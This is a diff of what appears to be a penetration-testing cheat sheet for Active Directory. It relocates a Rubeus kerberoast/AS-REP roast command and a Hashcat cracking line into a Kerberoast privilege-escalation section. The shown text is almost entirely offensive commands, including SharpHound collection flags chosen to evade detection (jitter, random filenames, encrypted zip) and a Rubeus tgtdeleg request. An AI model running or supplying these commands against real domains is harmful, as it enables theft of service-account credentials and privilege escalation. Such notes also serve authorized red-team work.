@@ -5,8 +5,7 @@ GhostPack Tools
   SharpView.exe (Network Enumeration)
     - Examples: https://powersploit.readthedocs.io/en/latest/Recon/Invoke-Kerberoast/
   SharpHound.exe -c All, Loggedon [-s|-d] --Throttle 20 --Jitter 7 --NoSaveCache --RandomFilenames --EncryptZip
-  Rubeus.exe keberoast asreproast /format:hashcat /outfile:hashes.tx
-    Hashcat -a0 -w3 -m 13100 [-r rules file] /path/to/hashes /path/to/dictionary 
+  Rubeus.exe (Kerberose Tool)
     
 Bloodhound/Neo4J
   # FIND SPN WITH DOMAIN ADMIN
@@ -74,6 +73,9 @@ Lateral Movement
   
 PrivEsc
   Kerberoast (Request SPN and get the TGS for offline cracking)
+    Rubeus.exe keberoast asreproast /format:hashcat /outfile:hashes.tx
+      Hashcat -a0 -w3 -m 13100 [-r rules file] /path/to/hashes /path/to/dictionary
+    -OR-
     SharpView.exe Invoke-Kerberoast (optional: -Domain:dom.fqdn -Server:DC.fqdn)
     Rubeus.exe /tgtdeleg /user:sqlservice (<-SamAccountName)
 
